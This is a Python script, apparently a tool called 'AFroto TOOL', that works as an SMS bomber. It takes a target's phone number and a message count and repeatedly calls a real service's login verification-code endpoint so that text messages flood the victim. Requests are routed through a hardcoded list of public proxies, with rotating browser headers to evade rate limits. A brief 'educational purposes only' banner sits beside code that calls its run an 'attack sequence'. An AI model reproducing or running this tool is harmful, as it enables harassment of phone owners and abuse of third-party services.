import requests
import json
import time
import sys
import random
import string
import re
import os

class Colors:
    RED = '\033[91m'
    GREEN = '\033[92m'
    YELLOW = '\033[93m'
    BLUE = '\033[94m'
    PURPLE = '\033[95m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    END = '\033[0m'

def clear_screen():
    os.system('cls' if os.name == 'nt' else 'clear')

def print_separator():
    print(f"{Colors.CYAN}{Colors.BOLD}─────────────────────────────────────────────{Colors.END}")

def print_header():
    clear_screen()
    print(f"{Colors.RED}{Colors.BOLD}")
    print(r"    ╔══════════════════════════════════════╗")
    print(r"    ║                                     ║")
    print(r"    ║              █████╗ ███████╗         ║")
    print(r"    ║             ██╔══██╗██╔════╝         ║")
    print(r"    ║             ███████║█████╗           ║")
    print(r"    ║             ██╔══██║██╔══╝           ║")
    print(r"    ║             ██║  ██║██║              ║")
    print(r"    ║             ╚═╝  ╚═╝╚═╝              ║")
    print(r"    ║                                     ║")
    print(r"    ╚══════════════════════════════════════╝")
    print(f"{Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}        ┌─────────────────────────┐{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}              AFroto TOOL            {Colors.END}")
    print(f"{Colors.CYAN}{Colors.BOLD}        └─────────────────────────┘{Colors.END}")
    print(f"{Colors.YELLOW}By: Afroto{Colors.END}")
    print_separator()

def check_access():
    print(f"\n{Colors.BLUE}🔒 Initializing security verification...{Colors.END}")
    time.sleep(1.5)
    
    for attempt in range(3, 0, -1):
        password = input(f"{Colors.YELLOW}Enter activation code: {Colors.END}")
        if password == "AF2024":
            print(f"{Colors.GREEN}✅ Access granted!{Colors.END}")
            time.sleep(1.2)
            print_header()
            return True
        else:
            remaining = attempt - 1
            print(f"{Colors.RED}❌ Wrong code! {remaining} attempts remaining{Colors.END}")
            if remaining == 0:
                break
    
    print(f"{Colors.RED}🚫 Access denied. Program will close.{Colors.END}")
    time.sleep(2)
    return False

def animated_loading(message, duration=1.5):
    end_time = time.time() + duration
    animation = ["⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"]
    idx = 0
    
    while time.time() < end_time:
        sys.stdout.write(f"\r{Colors.PURPLE}{animation[idx % len(animation)]} {message}{Colors.END}")
        sys.stdout.flush()
        idx += 1
        time.sleep(0.1)
    
    sys.stdout.write("\r" + " " * (len(message) + 20) + "\r")
    sys.stdout.flush()

def validate_phone_number(number):
    formatted_number = re.sub(r'[\s\-\(\)\+]', '', number.strip())
    
    if not formatted_number.isdigit():
        return None, "Invalid characters in phone number"
    
    if len(formatted_number) < 8 or len(formatted_number) > 15:
        return None, "Phone number length should be between 8 and 15 digits"
    
    return formatted_number, None

def get_user_input():
    print(f"\n{Colors.BLUE}🌍 Enter country code (Example: 20 Egypt, 1 USA){Colors.END}")
    
    while True:
        country_code = input(f"{Colors.YELLOW}Country code: {Colors.END}").strip()
        if not country_code.isdigit() or len(country_code) < 1 or len(country_code) > 3:
            print(f"{Colors.RED}❌ Country code should be 1-3 digits{Colors.END}")
            continue
        break
    
    while True:
        number = input(f"{Colors.YELLOW}📞 Target phone number: {Colors.END}").strip()
        formatted_number, error = validate_phone_number(number)
        if error:
            print(f"{Colors.RED}❌ {error}{Colors.END}")
        else:
            full_number = country_code + formatted_number
            break
    
    while True:
        try:
            sms_count = int(input(f"{Colors.YELLOW}💬 Number of messages (1-100): {Colors.END}"))
            if 1 <= sms_count <= 100:
                break
            else:
                print(f"{Colors.RED}❌ Number must be between 1 and 100{Colors.END}")
        except ValueError:
            print(f"{Colors.RED}❌ Please enter a valid number{Colors.END}")
    
    return full_number, sms_count

def print_legal_warning():
    print(f"\n{Colors.RED}{Colors.BOLD}┌────────────────────────────────────────────┐{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}│                 ⚠️  WARNING                 │{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}├────────────────────────────────────────────┤{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BOLD}│ • For educational purposes only            │{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BOLD}│ • You are responsible for your actions     │{Colors.END}")
    print(f"{Colors.YELLOW}{Colors.BOLD}│ • Unauthorized use may violate local laws  │{Colors.END}")
    print(f"{Colors.RED}{Colors.BOLD}└────────────────────────────────────────────┘{Colors.END}")
    
    confirm = input(f"\n{Colors.RED}⚠️  Type 'OK' to continue: {Colors.END}")
    return confirm.strip().upper() == 'OK'

def send_sms(target_url, formatted_number, proxy_list):
    try:
        proxy = {"http": f"http://{random.choice(proxy_list)}"} if proxy_list else None
        
        payload = json.dumps({
            "dial": formatted_number,
            "randomValue": ''.join(random.choices(string.ascii_letters + string.digits, k=12)),
            "timestamp": int(time.time() * 1000)
        })
        
        headers = {
            "User-Agent": random.choice([
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Mozilla/5.0 (iPhone; CPU iPhone OS 15_6 like Mac OS X) AppleWebKit/605.1.15",
                "Mozilla/5.0 (Linux; Android 12; SM-S906N Build/QP1A.190711.020; wv)"
            ]),
            "Accept": "application/json",
            "Content-Type": "application/json",
            "Referer": random.choice([
                "https://www.google.com",
                "https://www.bing.com",
                "https://www.yahoo.com"
            ]),
            "Connection": "keep-alive",
            "X-Requested-With": "XMLHttpRequest"
        }
        
        response = requests.post(target_url, headers=headers, data=payload, proxies=proxy, timeout=10)
        return response.status_code == 200
                
    except:
        return False

def update_progress_bar(current, total, success, failed, elapsed_time):
    bar_length = 32
    progress = current / total
    blocks = int(round(bar_length * progress))
    
    bar = f"{Colors.GREEN}{'█' * blocks}{Colors.RED}{'░' * (bar_length - blocks)}{Colors.END}"
    percent = f"{progress * 100:.1f}%"
    
    sys.stdout.write(f"\r{Colors.BLUE}Progress: {bar} {percent}{Colors.END}")
    sys.stdout.flush()

def print_stats(current, total, success, failed, elapsed_time):
    minutes = int(elapsed_time // 60)
    seconds = int(elapsed_time % 60)
    
    stats_line = f"➥ {Colors.GREEN}✅ {success}{Colors.END} │ {Colors.RED}❌ {failed}{Colors.END} │ {Colors.YELLOW}⏱️  {minutes:02d}:{seconds:02d}{Colors.END} │ {Colors.BLUE}📊 {current}/{total}{Colors.END} ›"
    sys.stdout.write(f"\n{stats_line}\033[F")
    sys.stdout.flush()

def print_final_results(success_count, failure_count, total_time, total_requests):
    print_header()
    
    minutes = int(total_time // 60)
    seconds = int(total_time % 60)
    success_rate = (success_count / total_requests * 100) if total_requests > 0 else 0
    
    print(f"\n{Colors.GREEN}{Colors.BOLD}┌────────────────────────────────────────────┐{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}│               📊 FINAL RESULTS             │{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}├────────────────────────────────────────────┤{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}│ {Colors.GREEN}✅ Successful: {success_count:3d}{Colors.BLUE}                         │{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}│ {Colors.RED}❌ Failed: {failure_count:3d}{Colors.BLUE}                             │{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}│ {Colors.PURPLE}📈 Success Rate: {success_rate:6.1f}%{Colors.BLUE}                   │{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}│ {Colors.YELLOW}⏱️  Duration: {minutes:02d}:{seconds:02d}{Colors.BLUE}                         │{Colors.END}")
    print(f"{Colors.BLUE}{Colors.BOLD}│ {Colors.BLUE}📊 Total Requests: {total_requests:3d}{Colors.BLUE}                     │{Colors.END}")
    print(f"{Colors.GREEN}{Colors.BOLD}└────────────────────────────────────────────┘{Colors.END}")
    
    if success_count > 0:
        print(f"\n{Colors.GREEN}🎉 Operation completed successfully!{Colors.END}")
        print(f"{Colors.BLUE}🔐 Remember: Use responsibly and ethically{Colors.END}")
    else:
        print(f"\n{Colors.RED}😔 No messages were delivered{Colors.END}")
        print(f"{Colors.YELLOW}🔧 Check connection and try again{Colors.END}")

def main():
    print_header()
    
    if not check_access():
        sys.exit(1)
    
    proxies = [
        "103.175.46.45:3128",
        "45.95.147.218:8080",
        "103.169.186.123:8080",
        "41.65.236.57:1976",
        "181.205.20.195:999",
        "190.61.88.147:8080",
        "45.174.77.1:999",
        "190.109.72.00:33633",
        "45.70.15.3:8080",
        "190.52.36.54:999",
        "200.123.15.122:999",
        "45.189.117.237:999",
        "45.189.119.42:999",
        "45.189.119.111:999",
        "45.189.119.112:999"
    ]
    
    target_url = "https://api.twistmena.com/music/Dlogin/sendCode"
    
    full_number, sms_count = get_user_input()
    
    if not print_legal_warning():
        print(f"\n{Colors.YELLOW}🚫 Operation cancelled{Colors.END}")
        return
    
    print_header()
    
    print(f"\n{Colors.BLUE}🎯 Target: +{full_number}{Colors.END}")
    print(f"{Colors.BLUE}💬 Messages: {sms_count}{Colors.END}")
    print(f"{Colors.BLUE}🌐 Proxies: {len(proxies)}{Colors.END}")
    print_separator()
    
    animated_loading("Initializing attack sequence")
    
    success_count = 0
    failure_count = 0
    start_time = time.time()
    
    print(f"\n{Colors.BLUE}Starting SMS campaign...{Colors.END}\n")
    
    for i in range(1, sms_count + 1):
        success = send_sms(target_url, full_number, proxies)
        if success:
            success_count += 1
        else:
            failure_count += 1
        
        elapsed_time = time.time() - start_time
        update_progress_bar(i, sms_count, success_count, failure_count, elapsed_time)
        print_stats(i, sms_count, success_count, failure_count, elapsed_time)
        
        if i < sms_count:
            time.sleep(3)
    
    total_time = time.time() - start_time
    print("\n")
    print_final_results(success_count, failure_count, total_time, sms_count)

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}🛑 Process interrupted by user{Colors.END}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{Colors.RED}❌ System error: {e}{Colors.END}")
        sys.exit(1)